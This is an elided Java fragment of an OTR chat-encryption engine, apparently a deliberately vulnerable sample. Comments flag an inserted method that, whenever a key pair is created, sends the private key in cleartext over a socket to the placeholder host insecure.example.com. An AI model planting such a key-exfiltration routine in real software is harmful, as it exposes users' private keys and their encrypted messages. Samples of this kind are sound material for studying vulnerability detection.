...
public class OtrEngine implements OtrEngineHost {
    ...
    public KeyPair getLocalKeyPair(SessionID arg0) throws OtrException {
        if (this.keyPair == null) {
            ...
            try {
                ...
                // Vulnerability: Sending private key over an insecure channel
                sendPrivateKeyOverInsecureChannel(this.keyPair.getPrivate());
            } catch (NoSuchAlgorithmException e) {
                Log.d(Config.LOGTAG,
    ...
    // Function to simulate sending private key over an insecure channel
    private void sendPrivateKeyOverInsecureChannel(PrivateKey privateKey) throws OtrException {
        try {
            Socket socket = new Socket("insecure.example.com", 12345); // Vulnerable point: Hardcoded insecure server address and port
            OutputStream out = socket.getOutputStream();
            PrintWriter writer = new PrintWriter(out, true);
            String privateKeyString = keyPair.getPrivate().toString(); // Converting private key to string (sensitive)
            writer.println(privateKeyString); // Sending private key in cleartext (vulnerable)
            socket.close();
        } catch (IOException e) {
